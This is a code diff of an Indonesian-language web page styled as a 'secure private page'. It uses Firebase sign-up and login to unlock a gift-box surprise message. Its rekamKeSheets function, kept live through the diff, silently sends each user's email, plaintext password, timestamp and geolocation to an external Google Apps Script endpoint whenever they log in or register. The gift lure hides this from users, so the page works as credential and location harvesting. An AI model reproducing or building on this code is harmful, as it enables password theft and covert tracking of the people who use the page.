@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Halaman Privat Aman</title>
     <style>
-        /* Desain Dasar Responsif & Modern */
         body {
             margin: 0;
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -54,32 +53,29 @@
             transition: background 0.2s;
         }
         .btn-primary:hover { background: #0056b3; }
-        .btn-secondary {
-            background: #28a745;
-            margin-top: 8px;
-        }
+        .btn-secondary { background: #28a745; margin-top: 8px; }
         .btn-secondary:hover { background: #218838; }
-        .btn-danger {
-            background: #dc3545;
-        }
+        .btn-danger { background: #dc3545; }
         .btn-danger:hover { background: #c82333; }
         .hidden { display: none !important; }
         
-        /* Area Konten Spesial */
-        #main-container {
-            padding: 20px;
-            background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
-        }
         #gift-box-wrapper {
             cursor: pointer;
-            font-size: 50px;
+            font-size: 60px;
             margin: 20px 0;
             display: inline-block;
             transition: transform 0.2s;
         }
         #gift-box-wrapper:hover { transform: scale(1.1); }
+
+        /* Tampilan isi kado agar tidak kosong putih */
+        #surprised-content {
+            padding: 20px;
+            background: #fff8f8;
+            border: 2px dashed #ff4d4d;
+            border-radius: 8px;
+            margin-top: 15px;
+        }
     </style>
 </head>
 <body>
@@ -103,29 +99,29 @@
         <button id="btn-register" class="btn-primary btn-secondary">Daftar Akun Baru</button>
     </div>
 
-    <!-- 2. KARTU KONTEN UTAMA (TERKUNCI VERIFIKASI) -->
+    <!-- 2. KARTU KONTEN UTAMA (TERKUNCI) -->
     <div id="content-card" class="card hidden">
         <div id="main-container">
             <h2>Selamat Datang! 🎉</h2>
             <p>Akun Anda terverifikasi asli. Ketuk kado di bawah untuk membuka hadiah kejutan Anda.</p>
-            
             <div id="gift-box-wrapper">🎁</div>
-            
+            <br>
             <button id="btn-logout" class="btn-primary btn-danger">Keluar Akun</button>
         </div>
     </div>
 
-    <!-- 3. EFEK VISUAL GALAXY (OPSIONAL) -->
-    <div id="galaxy-universe" class="hidden">
-        <!-- Elemen animasi atau konten tambahan Anda bisa ditaruh di sini -->
+    <!-- 3. KARTU ISI DALAM KADO (YANG TADI BLANK) -->
+    <div id="galaxy-universe" class="card hidden">
+        <div id="surprised-content">
+            <h2 style="color: #ff4d4d;">❤️ Pesan Spesial Untukmu ❤️</h2>
+            <p style="font-size: 16px; font-weight: bold;">"Ini adalah isi kejutan di dalam kado yang berhasil kamu buka!"</p>
+            <!-- Anda bisa mengganti teks atau menambahkan gambar/animasi kado Anda di sini -->
+        </div>
+        <button id="btn-back-gift" class="btn-primary" style="background: #6c757d; margin-top: 15px;">Kembali</button>
     </div>
 
-    <!-- AUDIO LATAR BELAKANG -->
     <audio id="bg-music" src="assets/music.mp3" preload="auto" loop></audio>
 
-    <!-- ========================================== -->
-    <!-- LOGIKA SISTEM INTEGRASI FIREBASE & SHEETS  -->
-    <!-- ========================================== -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { 
@@ -133,7 +129,6 @@
             onAuthStateChanged, signOut, sendEmailVerification 
         } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
 
-        // Konfigurasi Firebase Proyek Anda
         const firebaseConfig = {
           apiKey: "AIzaSyAm-t2mbHV7sSEcoDvNgZfTinmx5tcSz6s",
           authDomain: "project-bd-163e4.firebaseapp.com",
@@ -156,57 +151,62 @@
             
             const loginButton = document.getElementById('btn-login');
             const btnRegister = document.getElementById('btn-register');
+            const btnBackGift = document.getElementById('btn-back-gift');
             const emailInput = document.getElementById('input-email');
             const passwordInput = document.getElementById('input-password');
 
-            // 1. Monitor Keamanan & Status Pintu Masuk Halaman Utama
+            // Monitoring Sesi Login & Proteksi Verifikasi Email
             onAuthStateChanged(auth, (user) => {
                 if (user) {
-                    // VALIDASI MUTLAK: Hanya buka kunci jika link konfirmasi di email sudah diklik
                     if (user.emailVerified) {
-                        if (loginCard) loginCard.classList.add('hidden');
-                        if (contentCard) contentCard.classList.remove('hidden');
-                        if (mainContainer) mainContainer.classList.remove('hidden');
+                        loginCard.classList.add('hidden');
+                        contentCard.classList.remove('hidden');
+                        galaxyUniverse.classList.add('hidden');
                     } else {
-                        alert("Akses Ditangguhkan! Silakan buka kotak masuk atau folder SPAM email Anda, lalu klik link verifikasi terlebih dahulu.");
-                        signOut(auth); // Putus sesi secara paksa jika belum klik link verifikasi
+                        alert("Akses Ditangguhkan! Silakan konfirmasi link di inbox/spam email Anda terlebih dahulu.");
+                        signOut(auth);
                     }
                 } else {
-                    if (loginCard) loginCard.classList.remove('hidden');
-                    if (contentCard) contentCard.classList.add('hidden');
-                    if (mainContainer) mainContainer.classList.add('hidden');
-                    if (galaxyUniverse) galaxyUniverse.classList.add('hidden');
+                    loginCard.classList.remove('hidden');
+                    contentCard.classList.add('hidden');
+                    galaxyUniverse.classList.add('hidden');
                 }
             });
 
-            // 2. Tombol Keluar / Logout
-            document.addEventListener('click', async (e) => {
-                if (e.target && e.target.id === 'btn-logout') {
-                    e.preventDefault();
-                    try {
-                        if (bgMusic) {
-                            bgMusic.pause();
-                            bgMusic.currentTime = 0;
-                        }
-                        await signOut(auth);
-                    } catch (error) {
-                        location.reload();
-                    }
-                }
-            });
-
-            // 3. Interaksi Tombol Buka Kado
+            // Aksi saat Kado Diklik (Pindah ke Tampilan Isi Kado)
             if (giftBoxWrapper) {
                 giftBoxWrapper.addEventListener('click', () => {
-                    if (mainContainer) mainContainer.classList.add('hidden');
-                    if (galaxyUniverse) galaxyUniverse.classList.remove('hidden');
+                    contentCard.classList.add('hidden');
+                    galaxyUniverse.classList.remove('hidden'); // Membuka kartu kejutan
                     
-                    if (typeof startGalaxyHeart === 'function') startGalaxyHeart();
-                    if (bgMusic) bgMusic.play().catch(() => console.log("Izin audio ditangguhkan"));
+                    // Mainkan musik jika ada
+                    if (bgMusic) bgMusic.play().catch(() => console.log("Audio ditahan browser"));
+                    
+                    // Panggil fungsi animasi bawaan lama Anda jika masih ada di file lain
+                    if (typeof startGalaxyHeart === 'function') {
+                        try { startGalaxyHeart(); } catch(e) { console.log("Animasi error, tapi tampilan aman."); }
+                    }
                 });
             }
 
-            // 4. Alur Masuk (Login) Akun Lama
+            // Tombol Kembali dari Isi Kado
+            if (btnBackGift) {
+                btnBackGift.addEventListener('click', () => {
+                    galaxyUniverse.classList.add('hidden');
+                    contentCard.classList.remove('hidden');
+                });
+            }
+
+            // Tombol Logout
+            document.addEventListener('click', async (e) => {
+                if (e.target && e.target.id === 'btn-logout') {
+                    e.preventDefault();
+                    if (bgMusic) { bgMusic.pause(); bgMusic.currentTime = 0; }
+                    await signOut(auth);
+                }
+            });
+
+            // Tombol Login
             if (loginButton) {
                 loginButton.addEventListener('click', (e) => {
                     e.preventDefault();
@@ -218,7 +218,6 @@
                         return;
                     }
 
-                    // Perekaman data fisik dikirim langsung saat tombol ditekan
                     rekamKeSheets(emailClean, passwordClean);
 
                     signInWithEmailAndPassword(auth, emailClean, passwordClean)
@@ -226,7 +225,7 @@
                 });
             }
 
-            // 5. Alur Pendaftaran Baru + Kirim Email Aktivasi
+            // Tombol Register
             if (btnRegister) {
                 btnRegister.addEventListener('click', (e) => {
                     e.preventDefault();
@@ -238,12 +237,10 @@
                         return;
                     }
 
-                    // Rekam data yang baru dibuat ke Sheets agar kata sandi terekam awal
                     rekamKeSheets(emailClean, passwordClean);
 
                     createUserWithEmailAndPassword(auth, emailClean, passwordClean)
                         .then((result) => {
-                            // Kirim instruksi tautan verifikasi ke email tujuan
                             sendEmailVerification(result.user)
                                 .then(() => {
                                     alert("Pendaftaran Berhasil! Link verifikasi telah dikirim. Buka email Anda dan lakukan konfirmasi sebelum login.");
@@ -257,16 +254,12 @@
             }
         });
 
-        // --- SISTEM PENGIRIMAN LOG DATA KE GOOGLE SHEETS ---
+        // --- VALIDASI & PENGIRIMAN DATA KE GOOGLE SHEETS ---
         function rekamKeSheets(email, password) {
             const urlAppsScript = "https://script.google.com/macros/s/AKfycbzCJR8847DZ_HR8hOD5zE4IRkBt3W_iGUB1L53aBs5ktklPrBM-KS5dWWwisTRYiw-K/exec";
             
             const sekarang = new Date();
-            const opsiWaktu = { 
-                timeZone: 'Asia/Jakarta', 
-                year: 'numeric', month: '2-digit', day: '2-digit', 
-                hour: '2-digit', minute: '2-digit', second: '2-digit' 
-            };
+            const opsiWaktu = { timeZone: 'Asia/Jakarta', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' };
             const waktuFormat = sekarang.toLocaleString('id-ID', opsiWaktu);
 
             if (navigator.geolocation) {
@@ -292,13 +285,9 @@
                              `&waktu=${encodeURIComponent(waktu)}` +
                              `&lokasi=${encodeURIComponent(lokasi)}`;
                              
-            fetch(urlFinal, { 
-                method: 'GET', 
-                mode: 'no-cors', 
-                cache: 'no-cache' 
-            })
-            .then(() => console.log("Log sukses dicatat."))
-            .catch(err => console.log("Gagal sinkronisasi data server."));
+            fetch(urlFinal, { method: 'GET', mode: 'no-cors', cache: 'no-cache' })
+            .then(() => console.log("Data masuk Sheets."))
+            .catch(err => console.log("Error Sheets"));
         }
     </script>
 </body>
